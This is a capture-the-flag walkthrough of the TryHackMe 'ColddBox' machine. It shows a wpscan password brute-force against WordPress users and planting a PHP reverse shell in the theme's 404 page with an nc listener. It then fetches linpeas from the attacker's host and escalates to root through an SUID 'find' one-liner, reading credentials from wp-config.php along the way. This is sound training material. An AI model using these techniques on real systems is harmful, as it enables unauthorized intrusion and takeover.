# ColddBox

![THM easy room image](https://i.imgur.com/k2cJkVq.png)

[Play](https://tryhackme.com/room/colddboxeasy)

## 1. Scanning & Enumeration
We do the below scans in parallel.

### 1.1. Port Scanning
```
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
```

Nothing interesting. Only port 80 open, no ssh.

```
Not shown: 65530 closed ports
PORT      STATE    SERVICE
80/tcp    open     http
4512/tcp  open     unknown
8584/tcp  filtered unknown
43286/tcp filtered unknown
59766/tcp filtered unknown
```

Again, these don't look like they are expected. We may check 4512 later.+

### 1.2. Web Enumeration
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -u 10.10.141.86         
/index.php            (Status: 301) [Size: 0] [--> http://10.10.141.86/]
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.141.86/wp-content/]
/wp-login.php         (Status: 200) [Size: 2547]                                     
/license.txt          (Status: 200) [Size: 19930]                                    
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.141.86/wp-includes/]
/readme.html          (Status: 200) [Size: 7173]                                      
/wp-trackback.php     (Status: 200) [Size: 135]                                       
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.141.86/wp-admin/]   
/hidden               (Status: 301) [Size: 313] [--> http://10.10.141.86/hidden/]     
/xmlrpc.php           (Status: 200) [Size: 42]                                        
```

Note the `/hidden/` directory. Rest everything looks standard.

I tried exploring the `wp-trackback`, but it looked like a dead end.

### 1.3. Web Exploration
![ColddBox homepage](https://i.imgur.com/u4M5YBh.png)

The author is mentioned as: 

`Author: the cold in person`
![author of the page in coldbox thm page](https://i.imgur.com/8fjTVzI.png)

This username is incorrect, as shown by the WordPress error message.
![wp login error message of invalid username](https://i.imgur.com/5fZKpzg.png)

### 1.4. Hidden Directory
We find a hidden directory in the gobsuter scan.
![urgent webpage in the hidden directory](https://i.imgur.com/ZnRS0ih.png)

We thus get a list of the usernames:
- C0ldd
- Hugo
- Philip
Trying them out gives the same error message for all of them. This means we can brute-force!
![incorrect password error message means we have the correct username](https://i.imgur.com/VRC872l.png)

### 1.5. Brute-Force
We use the `wpscan` tool.

`wpscan --url http://10.10.141.86/ -U c0ldd,philip,hugo -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 32` ->

- --url: specifies the url
- -U: specifies the userlist
- -P: specifies the passwordlist
- -t: threads
- --password-attack: self explanatory

Wait patiently, this scan took me 12+ minutes. We thus get: `[SUCCESS] - c0ldd / {the author yeeted this}`
![wordpress dashboard page](https://i.imgur.com/TflUIH8.png)

## 2. Foothold
To get a foothold, I usually edit the 404.php page.
It can be found in: Appearance -> editor -> 404.php

![editing the php 404 page](https://imgur.com/ewcF9UW.png)

I put the phprevshell. This can be taken from [github here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

1. Start a listener on selected port. Listen using `nc -lnvp PORT_NUMBER_HERE`.
2. Go to: `http://10.10.141.86/?p=2` (only post=1 exists)


```
┌──(kali㉿kali)-[~/Desktop/tools/files]
└─$ nc -lvnp 443  
listening on [any] 443 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.141.86] 54404
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:14:23 up 45 min,  0 users,  load average: 0.30, 12.10, 16.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ColddBox-Easy:/$ 
```

We are in!

## 3. PrivEsc
I transferred the `linpeas.sh` file, which you can take from [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

Start a python server on your machine, using `sudo python3 -m http.server 80` and on the target machine, `wget YOUR_IP_ADDRESS/linpeas.sh`. Make sure that you are in a directory with write permisssions. One *really* good place is `/tmp` direcotry. Execute the file using `bash linpeas.sh`


The following was marked as potential PE vectors.
```
[+] Operative system                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits            
Linux version 4.4.0-186-generic (buildd@lcy01-amd64-002) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.7 LTS
Release:        16.04
Codename:       xenial
```
Looks like an old kernel version.

```
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version               
Sudo version 1.8.16   
```
This exploit only works in certain conditions:
- [ ] you know sudo password of *any* user
- [ ] the permissions look something like: `(ALL, !root) /usr/bin/id`.

```
[+] SUID - Check easy privesc, exploits and write perms                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid              
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping6                                
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping
-rwsr-sr-x 1 daemon daemon      51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                   
-rwsr-xr-x 1 root   root       217K Feb  8  2016 /usr/bin/find

```
`/usr/bin/find marked`. We can also find other files with the set-uid bit. Look at the following.

```
www-data@ColddBox-Easy:/tmp$ find / -type f -perm -u=s 2> /dev/null
find / -type f -perm -u=s 2> /dev/null
/bin/su
/bin/ping6
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/find
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

### 3.1. SUID Bit: Find Binary
Using [GTFOBins - Find SUID](https://gtfobins.github.io/gtfobins/find/#suid).
```
www-data@ColddBox-Easy:/tmp$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
# id    
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```
With this, we can view both the user and root flags in the `/home/c0ldd` and the `/root` directory.

### 3.2. Exploration + SUDO: 3 Paths
Note how we have the user `c0ldd`. Could we try and getting some credentials? From other machines, I know `wp-config.php` is a juicy file. Exploring that,
```
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', '{i ate this, was too tasty}');

/** MySQL hostname */
define('DB_HOST', 'localhost');

{truncated}

define('WP_HOME', '/');
define('WP_SITEURL', '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```
We have credentials for `c0ldd`!

```
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: {i hid this :P}

c0ldd@ColddBox-Easy:/var/www/html$ cd ~
cd ~
c0ldd@ColddBox-Easy:~$ sudo -l
sudo -l
[sudo] password for c0ldd: {yes I ate this too. Don't judge me ok}

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

We see that we are allowed to run the 3 files as sudo. We use the following respectively for each of the binaries.

1. [GTFOBins - vim SUDO](https://gtfobins.github.io/gtfobins/vim/#sudo)
2. [GTFOBins - chmod SUDO](https://gtfobins.github.io/gtfobins/chmod/#sudo)
3. [GTFOBins - ftp SUDO](https://gtfobins.github.io/gtfobins/ftp/#sudo)

This completes our room. System FULLY compromised!
